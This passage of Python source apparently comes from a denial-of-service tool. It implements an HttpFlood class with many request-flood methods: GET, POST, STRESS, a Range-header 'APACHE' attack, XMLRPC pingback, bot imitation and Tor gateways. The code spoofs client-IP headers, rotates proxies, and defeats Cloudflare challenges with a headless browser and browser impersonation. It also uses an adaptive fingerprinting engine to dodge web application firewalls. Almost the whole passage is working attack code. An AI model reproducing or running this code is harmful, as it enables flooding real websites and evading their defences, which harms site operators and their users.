                "Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
                "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
                "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
                "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
                "Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9",
                "Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_IncredibleS_S710e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
            ]
        self._useragents, self._req_type = list(useragents), self.getMethodType(method)
        self._rebuild_payload()

    async def _get_session(self) -> aiohttp.ClientSession:
        """Utilizes the centralized session manager."""
        return await AsyncHTTPManager.get_session()

    def _rebuild_payload(self):
        """Advanced Fingerprinting: Rebuilds payload with dynamic, realistic browser headers."""
        self._method_bytes = self._req_type.encode()
        self._path_bytes = self._target.raw_path_qs.encode()
        self._host_bytes = self._target.authority.encode()
        self._raw_host_bytes = self._target.raw_host.encode()
        self._host_header = b"Host: " + self._host_bytes + b"\r\n"
        
        # Use ML Engine if evasion is enabled
        if "--evasion" in argv:
            best_fp = ML_ENGINE.get_fingerprint()
            self._current_fp_id = best_fp["id"]
            self._current_delay = best_fp["delay"]
            self._fp_headers_bytes = best_fp["headers"].encode()
            self._conn_type_bytes = b"Connection: " + randchoice([b"keep-alive", b"Upgrade"]) + b"\r\n"
            self._useragents_bytes = [ua.encode() for ua in [best_fp["ua"]]]
        else:
            self._current_fp_id = None
            self._current_delay = 0.0
            self._fp_headers_bytes = (
                b"Accept-Encoding: gzip, deflate, br\r\n"
                b"Accept-Language: en-US,en;q=0.9\r\n"
                b"Cache-Control: max-age=0\r\n"
                b"Sec-Fetch-Dest: document\r\n"
                b"Sec-Fetch-Mode: navigate\r\n"
                b"Sec-Fetch-Site: none\r\n"
                b"Sec-Fetch-User: ?1\r\n"
                b"Sec-Gpc: 1\r\n"
                b"Pragma: no-cache\r\n"
                b"Upgrade-Insecure-Requests: 1\r\n"
            )
            self._conn_type_bytes = b"Connection: keep-alive\r\n"
            self._useragents_bytes = [ua.encode() for ua in self._useragents]
        
        self._referers_bytes = [ref.encode() for ref in self._referers]
        self._target_repr_quoted = parse.quote(self._target.human_repr()).encode()

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value

    async def BEHAVIOR(self) -> None:
        """Specialized BEHAVIOR behavioral bypass with auto-solve and sync."""
        if not CURL_CFFI_INSTALLED:
            logger.error("[!] curl-cffi not installed. BEHAVIOR method unavailable.")
            await asyncio.sleep(1)
            return

        from curl_cffi.requests import AsyncSession
        now = time()

        # Phase 1: Cookie Validation & Tactical Pre-flight Proxy Hunting
        if not HttpFlood._cfbuam_cookie or now > HttpFlood._cfbuam_expiry:
            # Step A: Fast Pre-flight Check (Async, No Lock)
            pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
            if pro:
                try:
                    px_dict = pro.asRequest()
                    ua_tmp = ML_ENGINE.get_fingerprint()["ua"]
                    async with AsyncSession(proxies=px_dict, verify=False, timeout=10) as s_tmp:
                        await s_tmp.get(str(self._target), headers={"User-Agent": ua_tmp})
                except Exception as e:
                    # Proxy is dead or extremely slow. 
                    logger.debug(f"[*] BEHAVIOR: Proxy {pro.host} failed pre-flight: {type(e).__name__}")
                    # Brief cooldown to prevent CPU-hogging tight loops
                    await asyncio.sleep(0.5)
                    return

            # Step B: Parallel Solver for "Live" Proxies
            async with HttpFlood._readtoon_sem:
                if not HttpFlood._cfbuam_cookie or now > HttpFlood._cfbuam_expiry:
                    # Ignore 60s cooldown if cookie is completely missing (discovery mode)
                    is_missing = not HttpFlood._cfbuam_cookie or HttpFlood._cfbuam_cookie == "_yummy=choco"
                    last_attempt = getattr(HttpFlood, '_last_solve_attempt', 0)
                    
                    if is_missing or (now - last_attempt > 60):
                        HttpFlood._last_solve_attempt = now
                        HttpFlood._solve_phase = "solving"
                        logger.info(f"{bcolors.OKCYAN}[*] BEHAVIOR: Live Proxy found. Solving for {self._target.host}...{bcolors.RESET}")
                        
                        proxy_str = str(pro) if pro else None
                        ua_target = ML_ENGINE.get_fingerprint()["ua"]
                        
                        cookie, ua = await asyncio.to_thread(BrowserEngine.solve_cf, str(self._target), proxy=proxy_str, user_agent=ua_target)
                        HttpFlood._solve_phase = "flooding" if cookie else "idle"
                        
                        if cookie == "proxy_error":
                            HttpFlood._last_solve_attempt = 0
                            return
                        elif cookie:
                            async with HttpFlood._cfbuam_lock:
                                HttpFlood._cfbuam_cookie = cookie
                                if ua: HttpFlood._cfbuam_ua = ua
                                HttpFlood._cfbuam_proxy = proxy_str
                                HttpFlood._cfbuam_expiry = now + 900
                                if "--session-id" in sys.argv and "cf_clearance" in cookie and cookie != "_yummy=choco":
                                    import json
                                    payload = {'target': str(self._target.host), 'cookie': cookie, 'ua': ua}
                                    print(f"__SYNC_BYPASS__||{json.dumps(payload)}")
                        else:
                            async with HttpFlood._cfbuam_lock:
                                HttpFlood._cfbuam_cookie = "_yummy=choco"
                                HttpFlood._cfbuam_expiry = now + 60
                            await asyncio.sleep(5)
                            return

        target_str = str(self._target)
        novel_url = target_str
        if "/content/" in target_str:
            novel_url = target_str.replace("/content/", "/novel/").rsplit("/", 1)[0] + "/"
        
        ua_bytes = (HttpFlood._cfbuam_ua or randchoice(self._useragents)).encode()
        cookie_bytes = f"Cookie: {HttpFlood._cfbuam_cookie}\r\n".encode()
        spoof = ProxyTools.Random.rand_ipv4().encode()
        ref = b"https://google.com/"

        req = b"".join([
            self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
            b"Host: ", self._host_bytes, b"\r\n",
            cookie_bytes,
            b"Connection: ", self._conn_type_bytes, b"\r\n",
            b"User-Agent: ", ua_bytes, b"\r\n",
            b"Referer: ", ref, b"\r\n",
            self._fp_headers_bytes,
            b"X-Forwarded-For: ", spoof, b"\r\n",
            b"Client-IP: ", spoof, b"\r\n",
            b"Real-IP: ", spoof, b"\r\n",
            b"\r\n"
        ])
        
        try:
            if CURL_CFFI_INSTALLED:
                from curl_cffi.requests import AsyncSession
                ua = HttpFlood._cfbuam_ua or randchoice(self._useragents)
                headers = {
                    "User-Agent": ua,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive",
                    "Referer": "https://google.com/",
                    "Upgrade-Insecure-Requests": "1"
                }
                if HttpFlood._cfbuam_cookie:
                    headers["Cookie"] = HttpFlood._cfbuam_cookie

                if HttpFlood._cfbuam_cookie and HttpFlood._cfbuam_proxy:
                    # IP-lock bypass: force the solver proxy for the flood loop
                    px = f"http://{HttpFlood._cfbuam_proxy}" if "://" not in HttpFlood._cfbuam_proxy else HttpFlood._cfbuam_proxy
                    proxies = {"http": px, "https": px}
                    pro = None
                else:
                    pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
                    proxies = {"http": pro.asRequest()["http"], "https": pro.asRequest()["https"]} if pro else None
                
                profile = BrowserEngine.get_curl_profile(ua)
                async with AsyncSession(impersonate=profile, proxies=proxies, verify=False) as s:
                    # Step 1: Visit Novel Landing Page to simulate behavior
                    try:
                        await s.get(novel_url, headers=headers, timeout=10)
                    except Exception:
                        pass

                    # Step 2: Flood Content endpoints
                    for _ in range(self._rpc):
                        for attempt in range(3):
                            try:
                                res = await s.get(self._target.human_repr(), headers=headers, timeout=10)
                                
                                global REQUESTS_SENT, BYTES_SEND, SUCCESS_SENT, WAF_SENT, ERROR_SENT
                                REQUESTS_SENT += 1
                                BYTES_SEND += len(res.content)
                                
                                code = str(res.status_code)
                                
                                # --- Diagnostic Telemetry: Headless Visibility ---
                                if "--debug" in argv or "--adaptive" in argv:
                                    try:
                                        import re
                                        raw_html = res.text[:2000]
                                        title_match = re.search(r'<title>(.*?)</title>', raw_html, re.IGNORECASE)
                                        page_title = title_match.group(1).strip() if title_match else "N/A"
                                        cookies_dict = dict(res.cookies)
                                        logger.debug(f"{bcolors.OKCYAN}[*] BEHAVIOR Content Fetch | Status: {code} | Title: '{page_title[:40]}' | Cookies: {list(cookies_dict.keys())[:3]}{bcolors.RESET}")
                                    except Exception as e:
                                        import traceback
                                        logger.debug(f"{bcolors.FAIL}  [!] BEHAVIOR Telemetry Error: {str(e)[:50]}\n{traceback.format_exc()}{bcolors.RESET}")
                                # ---------------------------------------------------

                                if code.startswith(('2', '3')): SUCCESS_SENT += 1
                                elif code.startswith('4'): WAF_SENT += 1
                                elif code.startswith('5'): ERROR_SENT += 1
                                await asyncio.sleep(0)
                                break
                            except Exception as e:
                                if attempt == 2:
                                    if "--debug" in argv or "--adaptive" in argv:
                                        import traceback
                                        logger.debug(f"{bcolors.FAIL}[*] BEHAVIOR Exception Stack: {type(e).__name__} - {e}\n{traceback.format_exc()}{bcolors.RESET}")
                                    else:
                                        logger.debug(f"[*] BEHAVIOR Exception: {e}")
                                    global TIMEOUT_SENT
                                    TIMEOUT_SENT += 1
                                    if pro and self._proxy_pool:
                                        self._proxy_pool.report_failure(pro)
                                else:
                                    await asyncio.sleep(0.5 * (2 ** attempt))
            else:
                for attempt in range(3):
                    try:
                        reader, writer = await self.open_connection()
                        async with writer:
                            for _ in range(self._rpc):
                                await self._send_async(writer, req, reader)
                                await asyncio.sleep(0)
                        break
                    except Exception as e:
                        if attempt == 2:
                            logger.debug(f"[*] BEHAVIOR Socket Exception: {e}")
                            TIMEOUT_SENT += 1
                        else:
                            await asyncio.sleep(0.5 * (2 ** attempt))
        except Exception as e:
            logger.debug(f"[*] BEHAVIOR Outer Exception: {e}")
            TIMEOUT_SENT += 1

    async def run(self) -> None:
        if self._synevent:
            while not self._synevent.is_set():
                await asyncio.sleep(0.1)
        self.select(self._method)
        original_rpc = self._rpc
        smart_rpc_enabled = "--smart" in argv
        evasion_enabled = "--evasion" in argv

        # Ensure _cffi_session is not used globally
        self._cffi_session = None

        while self._synevent.is_set():
            if evasion_enabled:
                self._rebuild_payload()
                if self._current_delay > 0:
                    await asyncio.sleep(self._current_delay)

            if smart_rpc_enabled:
                # Progressive Smart RPC Tuning (Pro-Max implementation)
                current_lat = CURRENT_LATENCY.value
                if current_lat > 3000 or current_lat == -1.0: # Severe lag or Timeout
                    self._rpc = max(1, original_rpc // 4)
                elif current_lat > 1000: # Significant lag
                    self._rpc = max(1, original_rpc // 2)
                elif current_lat > 500: # Moderate lag
                    self._rpc = max(1, int(original_rpc * 0.75))
                else: # Clean response
                    self._rpc = original_rpc

            try:
                await self.SENT_FLOOD()
                # If we get here, no direct exception occurred in the flood method
                if evasion_enabled and self._current_fp_id:
                    # Reward or penalize based on latency
                    is_success = (CURRENT_LATENCY.value != -1.0 and CURRENT_LATENCY.value < 3000)
                    await asyncio.to_thread(ML_ENGINE.report_result, self._current_fp_id, is_success)
            except Exception:
                if evasion_enabled and self._current_fp_id:
                    await asyncio.to_thread(ML_ENGINE.report_result, self._current_fp_id, False)

            await asyncio.sleep(0) # Yield control

        if getattr(self, '_cffi_session', None):
            await self._cffi_session.close()            
            await asyncio.sleep(0) # Yield control to event loop to prevent stalls

    def generate_payload(self, other: bytes = None) -> bytes:
        """High-efficiency byte assembly to minimize CPU overhead in flood loops."""
        if not other:
            if not hasattr(self, '_payload_batch'):
                self._payload_batch = []
                self._payload_idx = 0
                for _ in range(100):
                    sp = ProxyTools.Random.rand_ipv4().encode()
                    b = b"".join([
                        self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
                        self._host_header,
                        self._conn_type_bytes,
                        b"User-Agent: ", randchoice(self._useragents_bytes), b"\r\n",
                        b"Referer: ", randchoice(self._referers_bytes), self._target_repr_quoted, b"\r\n",
                        self._fp_headers_bytes,
                        b"X-Forwarded-For: ", sp, b"\r\n",
                        b"Client-IP: ", sp, b"\r\n",
                        b"Real-IP: ", sp, b"\r\n\r\n"
                    ])
                    self._payload_batch.append(b)

            self._payload_idx = (self._payload_idx + 1) % 100
            return self._payload_batch[self._payload_idx]

        spoof = ProxyTools.Random.rand_ipv4().encode()
        other_bytes = other if isinstance(other, bytes) else other.encode()

        return b"".join([
            self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
            self._host_header,
            self._conn_type_bytes,
            b"User-Agent: ", randchoice(self._useragents_bytes), b"\r\n",
            b"Referer: ", randchoice(self._referers_bytes), self._target_repr_quoted, b"\r\n",
            self._fp_headers_bytes,
            b"X-Forwarded-For: ", spoof, b"\r\n",
            b"Client-IP: ", spoof, b"\r\n",
            b"Real-IP: ", spoof, b"\r\n",
            other_bytes,
            b"\r\n"
        ])
    async def open_connection(self, host=None):
        proxy = None
        if self._proxy_pool:
            proxy = self._proxy_pool.get_proxy()
            
        try:
            if proxy:
                # logger.debug(f"[*] Connecting via proxy: {proxy}")
                sock = await asyncio.to_thread(proxy.open_socket, AF_INET, SOCK_STREAM)
                sock.settimeout(5)
                await asyncio.to_thread(sock.connect, host or self._raw_target)
                sock.setblocking(False)
            else:
                sock = socket(AF_INET, SOCK_STREAM)
                sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                sock.setblocking(False)
                loop = asyncio.get_event_loop()
                await loop.sock_connect(sock, host or self._raw_target)

            if self._target.scheme.lower() == "https":
                reader, writer = await asyncio.open_connection(
                    sock=sock, 
                    ssl=ctx, 
                    server_hostname=self._target.host
                )
            else:
                reader, writer = await asyncio.open_connection(sock=sock)
            
            return reader, writer
        except Exception as e:
            # logger.debug(f"[!] Connection failed: {e}")
            if proxy and self._proxy_pool:
                self._proxy_pool.report_failure(proxy)
            raise

    async def HEAD(self) -> None:
        """High-efficiency HEAD flood."""
        payload = self.generate_payload()
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except Exception:
            pass

    _sample_count = 0

    async def _send_async(self, writer: asyncio.StreamWriter, data: bytes, reader: asyncio.StreamReader = None):
        global BYTES_SEND, REQUESTS_SENT, SUCCESS_SENT, WAF_SENT, ERROR_SENT, TIMEOUT_SENT
        try:
            writer.write(data)
            await writer.drain()
            BYTES_SEND += len(data)
            REQUESTS_SENT += 1

            # Sampling: Every 50 requests, try to read the status line if reader is provided
            if reader and HttpFlood._sample_count % 50 == 0:
                try:
                    # Short timeout for sampling to avoid stalling the attack
                    line = await asyncio.wait_for(reader.readline(), timeout=1.0)
                    if line:
                        status_line = line.decode().upper()
                        if "HTTP/" in status_line:
                            parts = status_line.split()
                            if len(parts) >= 2:
                                code = parts[1]
                                if code.startswith(('2', '3')):
                                    SUCCESS_SENT += 1
                                elif code.startswith('4'):
                                    WAF_SENT += 1
                                elif code.startswith('5'):
                                    ERROR_SENT += 1
                except asyncio.TimeoutError:
                    TIMEOUT_SENT += 1
                except:
                    pass
            
            HttpFlood._sample_count += 1
        except (ConnectionResetError, BrokenPipeError, TimeoutError):
            TIMEOUT_SENT += 1
            raise
        except Exception:
            raise

    @property
    def randHeadercontent(self) -> str:
        return (
            f"User-Agent: {randchoice(self._useragents)}\r\n"
            f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n"
            + self.SpoofIP
        )

    @staticmethod
    def getMethodType(method: str) -> str:
        return (
            "GET"
            if {method.upper()}
            & {
                "CFB",
                "CFBUAM",
                "GET",
                "TOR",
                "COOKIE",
                "OVH",
                "EVEN",
                "DYN",
                "SLOW",
                "PPS",
                "APACHE",
                "BOT",
                "RHEX",
                "STOMP",
            }
            else (
                "POST"
                if {method.upper()} & {"POST", "XMLRPC", "STRESS"}
                else "HEAD" if {method.upper()} & {"GSB", "HEAD"} else "REQUESTS"
            )
        )

    async def POST(self) -> None:
        extra = (
            b"Content-Length: 44\r\n"
            b"X-Requested-With: XMLHttpRequest\r\n"
            b"Content-Type: application/json\r\n\r\n"
            b'{"data": "' + ProxyTools.Random.rand_str(32).encode() + b'"}'
        )
        payload = self.generate_payload(extra)
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def TOR(self) -> None:
        provider = "." + randchoice(tor2webs)
        target_host = self._target.authority.replace(".onion", provider)
        payload = b"".join([
            self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
            b"Host: ", target_host.encode(), b"\r\n",
            b"Connection: keep-alive\r\n\r\n"
        ])
        target = self._target.host.replace(".onion", provider), self._raw_target[1]
        try:
            reader, writer = await self.open_connection(target)
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def STRESS(self) -> None:
        extra = (
            b"Content-Length: 524\r\n"
            b"X-Requested-With: XMLHttpRequest\r\n"
            b"Content-Type: application/json\r\n\r\n"
            b'{"data": "' + ProxyTools.Random.rand_str(512).encode() + b'"}'
        )
        payload = self.generate_payload(extra)
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def COOKIES(self) -> None:
        payload = self.generate_payload(
            "Cookie: _ga=GA%s; _gat=1; __cfduid=dc232334gwdsd23434542342342342475611928; %s=%s\r\n"
            % (
                ProxyTools.Random.rand_int(1000, 99999),
                ProxyTools.Random.rand_str(6),
                ProxyTools.Random.rand_str(32),
            )
        )
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def APACHE(self) -> None:
        payload = self.generate_payload(
            "Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024))
        )
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def XMLRPC(self) -> None:
        payload = self.generate_payload(
            (
                "Content-Length: 345\r\n"
                "X-Requested-With: XMLHttpRequest\r\n"
                "Content-Type: application/xml\r\n\r\n"
                "<?xml version='1.0' encoding='iso-8859-1'?>"
                "<methodCall><methodName>pingback.ping</methodName>"
                "<params><param><value><string>%s</string></value>"
                "</param><param><value><string>%s</string>"
                "</value></param></params></methodCall>"
            )
            % (ProxyTools.Random.rand_str(64), ProxyTools.Random.rand_str(64))
        )[:-2]
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def PPS(self) -> None:
        payload = b"".join([
            self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
            b"Host: ", self._host_bytes, b"\r\n\r\n"
        ])
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def KILLER(self) -> None:
        tasks = []
        for _ in range(10):
            tasks.append(asyncio.create_task(self.GET()))
        await asyncio.gather(*tasks)

    async def GET(self) -> None:
        payload = self.generate_payload()
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except Exception:
            pass

    async def BOT(self) -> None:
        payload = self.generate_payload()
        p1 = b"".join([
            b"GET /robots.txt HTTP/1.1\r\nHost: ", self._target.raw_authority.encode(),
            b"\r\nConnection: Keep-Alive\r\nAccept: text/plain,text/html,*/*\r\nUser-Agent: ",
            randchoice(search_engine_agents).encode(), b"\r\nAccept-Encoding: gzip,deflate,br\r\n\r\n"
        ])
        p2 = b"".join([
            b"GET /sitemap.xml HTTP/1.1\r\nHost: ", self._target.raw_authority.encode(),
            b"\r\nConnection: Keep-Alive\r\nAccept: */*\r\nFrom: googlebot(at)googlebot.com\r\nUser-Agent: ",
            randchoice(search_engine_agents).encode(), b"\r\nAccept-Encoding: gzip,deflate,br\r\nIf-None-Match: ",
            ProxyTools.Random.rand_str(9).encode(), b"-", ProxyTools.Random.rand_str(4).encode(),
            b"\r\nIf-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n"
        ])
        try:
            reader, writer = await self.open_connection()
            async with writer:
                await self._send_async(writer, p1)
                await self._send_async(writer, p2)
                for _ in range(self._rpc):
                    await self._send_async(writer, payload, reader)
                    await asyncio.sleep(0)
        except: pass

    async def EVEN(self) -> None:
        payload = self.generate_payload()
        try:
            reader, writer = await self.open_connection()
            async with writer:
                while True:
                    await self._send_async(writer, payload, reader)
                    if not await reader.read(1):
                        break
        except: pass

    async def OVH(self) -> None:
        payload = self.generate_payload()
        try:
            reader, writer = await self.open_connection()
            async with writer:
                for _ in range(min(self._rpc, 5)):
                    await self._send_async(writer, payload, reader)
        except: pass

    async def CFB(self) -> None:
        """
        Enhanced Cloudflare Bypass: 
        Uses shared cf_clearance cookies if available for high-speed flooding.
        Falls back to synchronous cloudscraper if no clearance is found.
        """
        if not HttpFlood._cfbuam_cookie or HttpFlood._cfbuam_cookie == "_yummy=choco":
            if HttpFlood._solve_phase != "solving":
                try:
                    await self.CFBUAM()
                except Exception:
                    pass

        # If we have a valid clearance from CFBUAM, use the fast path
        if HttpFlood._cfbuam_cookie and HttpFlood._cfbuam_cookie != "_yummy=choco":
            try:
                # Reuse the logic from CFBUAM but optimized for mass-async
                ua_bytes = (HttpFlood._cfbuam_ua or randchoice(self._useragents)).encode()
                cookie_bytes = f"Cookie: {HttpFlood._cfbuam_cookie}\r\n".encode()
                spoof = ProxyTools.Random.rand_ipv4().encode()
                ref = (randchoice(self._referers) + parse.quote(self._target.human_repr())).encode()

                req = b"".join([
                    self._method_bytes, b" ", self._path_bytes, b" HTTP/1.1\r\n",
                    b"Host: ", self._host_bytes, b"\r\n",
                    cookie_bytes,
                    b"Connection: ", self._conn_type_bytes, b"\r\n",
                    b"User-Agent: ", ua_bytes, b"\r\n",
                    b"Referer: ", ref, b"\r\n",
                    self._fp_headers_bytes,
                    b"X-Forwarded-For: ", spoof, b"\r\n",
                    b"Client-IP: ", spoof, b"\r\n",
                    b"Real-IP: ", spoof, b"\r\n",
                    b"\r\n"
                ])

                reader, writer = await self.open_connection()
                async with writer:
                    for _ in range(self._rpc):
                        await self._send_async(writer, req)
                return
            except Exception:
                pass # Fallback to scraper on connection failure

        # Legacy/Fallback Path: Synchronous Scraper
        if CURL_CFFI_INSTALLED:
            await self._cffi_CFB()
        else:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(SYNC_EXECUTOR, self._sync_CFB)

    async def _cffi_CFB(self):
        """curl_cffi-based CF bypass with browser impersonation."""
        global BYTES_SEND, REQUESTS_SENT, TIMEOUT_SENT
        try:
            from curl_cffi.requests import AsyncSession
            async with HttpFlood._curl_cffi_sem:
                pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
                proxies = None
                if pro:
                    px = pro.asRequest()
                    px_str = px.get("http", f"http://{pro}")
                    proxies = {"http": px_str, "https": px_str}
                
                fp = ML_ENGINE.get_fingerprint()
                async with AsyncSession(
                    proxies=proxies,
                    impersonate="chrome133",
                    verify=False,
                    timeout=8,
                ) as session:
                    for _ in range(self._rpc):
                        try:
                            res = await session.get(self._target.human_repr(), headers={"User-Agent": fp["ua"]})
                            BYTES_SEND += len(res.content) + 200
                            REQUESTS_SENT += 1
                        except Exception:
                            TIMEOUT_SENT += 1
                            if pro and self._proxy_pool:
                                self._proxy_pool.report_failure(pro)
                            break
        except Exception:
            loop = asyncio.get_event_loop()
            await loop.run_in_executor(SYNC_EXECUTOR, self._sync_CFB)

    _scraper_cache = {}

    def _sync_CFB(self):
        global REQUESTS_SENT, BYTES_SEND
        
        # Use thread-local or cached scraper to reduce CPU overhead
        thread_id = current_thread().ident
        scraper = HttpFlood._scraper_cache.get(thread_id)
        
        if not scraper:
            try:
                scraper = create_scraper()
                HttpFlood._scraper_cache[thread_id] = scraper
            except Exception:
                return

        for _ in range(self._rpc):
            pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
            try:
                res = scraper.get(
                    self._target.human_repr(),
                    proxies=pro.asRequest() if pro else None,
                    timeout=5
                )
                BYTES_SEND += len(res.content) + len(str(res.headers))
                REQUESTS_SENT += 1
            except Exception:
                if pro and self._proxy_pool:
                    self._proxy_pool.report_failure(pro)

    _cfbuam_expiry = 0
    _cfbuam_proxy_fails = 0

    async def CFBUAM(self) -> None:
        """
        Cloudflare UAM Bypass using Headless Browser.
        Solves the JS challenge once globally, then all tasks use the synced cookies.
        """
        now = time()
        # Re-solve if no cookie, fallback cookie detected, or 15 mins passed
        if not HttpFlood._cfbuam_cookie or HttpFlood._cfbuam_cookie == "_yummy=choco" or now > HttpFlood._cfbuam_expiry:
            async with HttpFlood._cfbuam_lock:
                # Double-checked locking with 60s cooldown between re-solve attempts
                if (not HttpFlood._cfbuam_cookie or HttpFlood._cfbuam_cookie == "_yummy=choco" or now > HttpFlood._cfbuam_expiry) and (now - getattr(HttpFlood, '_last_solve_attempt', 0) > 60):
                    HttpFlood._last_solve_attempt = now
                    proxy_str = None
                    if self._proxy_pool:
                        for _ in range(50):
                            candidate = self._proxy_pool.get_proxy()
                            if candidate:
                                cand_str = str(candidate)
                                if HttpFlood._circuit_breaker.is_available(cand_str):
                                    proxy_str = cand_str
                                    break
                            else:
                                break
                        if not proxy_str:
                            candidate = self._proxy_pool.get_proxy()
                            if candidate:
                                proxy_str = str(candidate)
                    # Try with latest ML User-Agent
                    ua_target = ML_ENGINE.get_fingerprint()["ua"]
